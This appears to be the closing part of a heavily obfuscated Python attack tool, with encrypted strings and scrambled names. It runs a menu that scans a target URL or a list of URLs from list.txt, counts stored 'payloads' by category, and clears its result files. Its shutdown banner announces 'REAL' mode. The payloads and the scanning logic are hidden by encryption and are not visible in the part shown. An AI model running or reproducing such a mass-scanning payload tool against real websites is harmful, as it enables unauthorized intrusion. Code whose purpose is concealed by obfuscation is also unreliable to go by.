    _I0O0I1OlOlO0IlIO = {_1Ol10I0O0O(b'@\x93\x8d\x81\x9b\x17\x85\xe6X', b'\x85\x9e\n\xe4'): _OIlO10OIO1O1(b'g\xfeI1.\xdd\x05\xf0\x9a', b';\x80\x8dU'), _1Ol10I0O0O(b'l\xfbW\xdd\xd7\xbd\x06@\x8f\x19V\xb1#O\xb1', b'\xd7\xfe\xca\xcd'): _1Ol10I0O0O(b']\t\xe9\x0e\x12\x0fEi\xb9\x1a\xbb\x94\xb7\x81\xa7', b'\x98B:,'), _OIlO10OIO1O1(b'~\x94\\0\xde\x80N\xd8NV\x1c', b'\xe2\xd1:\xe0'): _OIlO10OIO1O1(b"']\xc9~\x8e\x03], \xa6\x19", b'd\xd1J\x9a'), _OIlO10OIO1O1(b'VcMT\x9c\xc2kQ1\xf1', b'\xfel<\x9e'): _1Ol10I0O0O(b'E \x8a&\xe5t%\xda\xd1\x1aY\x94', b'\x15\x18S\xea'), _OIlO10OIO1O1(b'\xa6\xc4\xcaD\xd4\xf8\x82\xac\x10zJD\x9e\xea\x1ea\x94d0', b'\xb41\xccA'): _l1OIOIOIIOIIl01I(b'\x14ay\xea\xaf\x04%\x03\x8b\xe9\x7f\x0fJ2LS\x06\xa3j', b'\x84\x16\x17\x8c'), _1Ol10I0O0O(b'o\xc8\xb8Y\x13l\x1e\x83\xe0g7', b'\xb4\xef\x94u'): _OIlO10OIO1O1(b'P+\xd6\xc0\xfd<L.`\x1e\xb1', b'%V\x92\xec'), _OIlO10OIO1O1(b'\xe6G\xf6\xf5S/\xa3\xdf<%\xdb\xc5', b'|\xe8\xd1b'): _l1OIOIOIIOIIl01I(b'\xc3V\x93\n\x97\xe3\x0fT\xdd7\x06\x0c', b'O\x1f\x13\x04'), _1Ol10I0O0O(b'\xfby\xd3\xe45?\xf5$Lg\x99\xf1\xe2\x90', b'B.\xea\xc2'): _1Ol10I0O0O(b'\\fI\x89\x166\x12Bw\xcdj\xc7B\xbf', b'\xcf\x9c\x8b\xf9'), _OIlO10OIO1O1(b'\xbb\x7f\xe5-T\xa7\xe4En', b'\xab+\x06\xf0'): _OIlO10OIO1O1(b'\xa5\xe4y\x04e#\xe6p\x0f', b'.\x1a\r\xb0'), _l1OIOIOIIOIIl01I(b'\x16\xd1@D\xeb\xb0\x11-\x9cH`\x1c', b'\x7f\xbf\xb5\x83'): _1Ol10I0O0O(b'\xee\xf8\x87\xd8G\x1e\x9d\xa3XBE\x82', b'%|p\xa0'), _l1OIOIOIIOIIl01I(b'\x159&_\x00\x82y\\o.z;', b'\xcbk\xf0e'): _l1OIOIOIIOIIl01I(b'\xeb\xfb\xeeP-\x89Sv@\xa8(\xe1', b'{\xc4s\xfd'), _OIlO10OIO1O1(b'@\xc2R\x86>T\xad\x16\x95W', b'\x1d05\x10'): _OIlO10OIO1O1(b'\xc3\xe7+\xee:\xfb\x94Mi\xd0', b'\xedI\x7f\xba')}
    for _1000I0llIIOI0lO, _100lIO0l0I0l0 in _1lOIO0Il1l0I101lI.items():
        _II00lI0O1OO0 = _I0O0I1OlOlO0IlIO.get(_1000I0llIIOI0lO, _1000I0llIIOI0lO.upper())
        print(f'{_lOO0O0101IOl00001.YELLOW}▶ {_II00lI0O1OO0}: {len(_100lIO0l0I0l0)}{_lOO0O0101IOl00001.RESET}')
        for p in _100lIO0l0I0l0[:111158655 ^ 111158647]:
            print(f'  {_lOO0O0101IOl00001.WHITE}• {p}{_lOO0O0101IOl00001.RESET}')
        if len(_100lIO0l0I0l0) > 1673053259 ^ 1673053251:
            print(f'  {_lOO0O0101IOl00001.MAGENTA}... and {len(_100lIO0l0I0l0) - 8} more{_lOO0O0101IOl00001.RESET}')
        print()
        total += len(_100lIO0l0I0l0)
    print(f'{_lOO0O0101IOl00001.CYAN}Total: {total} payloads{_lOO0O0101IOl00001.RESET}')
    input(f'\n{_lOO0O0101IOl00001.CYAN}Press Enter to return...{_lOO0O0101IOl00001.RESET}')

def _1l1Il110l1l():
    global _100III00lOI, _llIl0l00I001llOl, _I0O0O01OO1OI1O0O, _0llOlI10lIII1
    try:
        if _0Il1llO1lIO0l.path.exists(_lOO110110Il):
            open(_lOO110110Il, _l1OIOIOIIOIIl01I(b'\xe2', b'\xc3\xca\xdc\x8b')).close()
        if _0Il1llO1lIO0l.path.exists(_1IOI01l11l1O):
            _0Il1llO1lIO0l.remove(_1IOI01l11l1O)
        if _0Il1llO1lIO0l.path.exists(_10lIlOOl0llO):
            _1l01111l1O010.rmtree(_10lIlOOl0llO)
            _0Il1llO1lIO0l.makedirs(_10lIlOOl0llO)
    except:
        pass
    _100III00lOI = []
    _llIl0l00I001llOl = []
    _I0O0O01OO1OI1O0O = []
    _0llOlI10lIII1 = []
    print(f'{_lOO0O0101IOl00001.GREEN}All cleared!{_lOO0O0101IOl00001.RESET}')
    input(f'\n{_lOO0O0101IOl00001.CYAN}Press Enter to return...{_lOO0O0101IOl00001.RESET}')

def main():
    _0OOI0I0lOlI()
    if not _0Il1llO1lIO0l.path.exists(_lOO110110Il):
        open(_lOO110110Il, _OIlO10OIO1O1(b'\x16', b'\xf9\xd0I\xe1')).close()
    _Il1l0lIIl00l()
    try:
        import requests
        import colorama
    except ImportError:
        print(f'{_lOO0O0101IOl00001.RED}Run: pip install requests colorama{_lOO0O0101IOl00001.RESET}')
        _0OOl0III1101O.exit(32297867 ^ 32297866)
    while True:
        _1O1I1llO0l()
        choice = input(f'{_lOO0O0101IOl00001.CYAN}NOES@root:~$ {_lOO0O0101IOl00001.WHITE}').strip()
        if choice == _l1OIOIOIIOIIl01I(b'\xfd', b":'u8"):
            url = input(f'{_lOO0O0101IOl00001.YELLOW}Target URL: {_lOO0O0101IOl00001.WHITE}')
            if url:
                _l01Ol1110lII(url)
                input(f'\n{_lOO0O0101IOl00001.CYAN}Press Enter...{_lOO0O0101IOl00001.RESET}')
        elif choice == _1Ol10I0O0O(b'i', b'<2`\xd9'):
            if not _0Il1llO1lIO0l.path.exists(_l1OIOIOIIOIIl01I(b'\x94:/\xb6\x8c\xa3\xa9\xee', b'e\xf4\xad ')):
                print(f'{_lOO0O0101IOl00001.RED}list.txt not found!{_lOO0O0101IOl00001.RESET}')
                input(_l1OIOIOIIOIIl01I(b'\xa81\x9c\xba\x95\xf3\x04\x05\xa6\x06\x89X\x1d_', b'I\x01\xb4S'))
                continue
            with open(_l1OIOIOIIOIIl01I(b'\x99\x8c\xcd\xd1\xff\x08\x93\x0c', b'\x04\x88\xd2\x94'), _1Ol10I0O0O(b'\xd6', b'\xdf\xf2\xed\xa1')) as _0IO0l01IlllI:
                _1100O011IIl = [x.strip() for x in _0IO0l01IlllI.readlines() if x.strip()]
            if not _1100O011IIl:
                print(f'{_lOO0O0101IOl00001.RED}list.txt is empty!{_lOO0O0101IOl00001.RESET}')
                input(_1Ol10I0O0O(b'A\x0b{=\xc8!>\xb1\n\x9e\xb4\xb9U\xd4', b'c\xea8\xcd'))
                continue
            for _OI0ll0OI0OO1OOOI, u in enumerate(_1100O011IIl, 1614041252 ^ 1614041253):
                print(f'\n{_lOO0O0101IOl00001.YELLOW}Scanning {_OI0ll0OI0OO1OOOI}/{len(_1100O011IIl)}: {u}{_lOO0O0101IOl00001.RESET}')
                _l01Ol1110lII(u)
            input(f'\n{_lOO0O0101IOl00001.CYAN}Press Enter...{_lOO0O0101IOl00001.RESET}')
        elif choice == _OIlO10OIO1O1(b'|', b'(\xc4\xf3\xf1'):
            _OIIOOlII100()
        elif choice == _OIlO10OIO1O1(b'\x9c', b'\x04E )'):
            _OlO0OO0IO1I1l110()
        elif choice == _l1OIOIOIIOIIl01I(b'H', b'\xa0N\xb4\x11'):
            _l1lIO1OIl1lI0O()
        elif choice == _l1OIOIOIIOIIl01I(b'\xae', b'G\\\xfb\x01'):
            _1l1I010110()
        elif choice == _OIlO10OIO1O1(b'\xda', b'O\xde\x87\x89'):
            _IOI11lllOlI0l1l()
        elif choice == _l1OIOIOIIOIIl01I(b'\xdb', b'J\xfe\x83\x17'):
            _0l0OII11IOOI01II()
        elif choice == _1Ol10I0O0O(b'\xf3', b'O{0\xd3'):
            _1I0ll01IIOIlO0I1lO()
        elif choice == _OIlO10OIO1O1(b'U\xac', b'\x90d\xbd\x84'):
            _lOI10l1IlI1I10()
        elif choice == _OIlO10OIO1O1(b'\x16\xe0', b'\x06\xe5\x8e\xcb'):
            _1l1Il110l1l()
        elif choice.lower() == _OIlO10OIO1O1(b'Q', b'\n\xb0\xed\xd3'):
            _O0lIIOI1O0I1O1ll0()
        elif choice == _1Ol10I0O0O(b'\xf3', b'\xe1\xee\xb03'):
            print(f'\n{_lOO0O0101IOl00001.RED}╔═══════════════════════════════════════════╗')
            print(f'{_lOO0O0101IOl00001.RED}║   {_0l00OI0llII} SHUTDOWN                     ║')
            print(f'{_lOO0O0101IOl00001.RED}║   Thank you, Master!                    ║')
            print(f'{_lOO0O0101IOl00001.RED}║   Developer: {_lI0lOO0l010l1}                ║')
            print(f'{_lOO0O0101IOl00001.RED}║   Mode: REAL - All actions logged      ║')
            print(f'{_lOO0O0101IOl00001.RED}╚═══════════════════════════════════════════╝{_lOO0O0101IOl00001.RESET}')
            _0OOl0III1101O.exit(111898774 ^ 111898774)
        else:
            print(f'{_lOO0O0101IOl00001.RED}Unknown command! Use menu options.{_lOO0O0101IOl00001.RESET}')
            time.sleep(275284326 ^ 275284327)
if __name__ == _l1OIOIOIIOIIl01I(b"\xc5\xb4\xc5'\xa4Z\xa5\xc3", b'\x96\xa6\xa5\xf2'):
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n\n{_lOO0O0101IOl00001.RED}Interrupted by user!{_lOO0O0101IOl00001.RESET}')
        _0OOl0III1101O.exit(438801950 ^ 438801950)
    except Exception as e:
        print(f'\n{_lOO0O0101IOl00001.RED}Fatal Error: {e}{_lOO0O0101IOl00001.RESET}')
        _0OOl0III1101O.exit(206851335 ^ 206851334)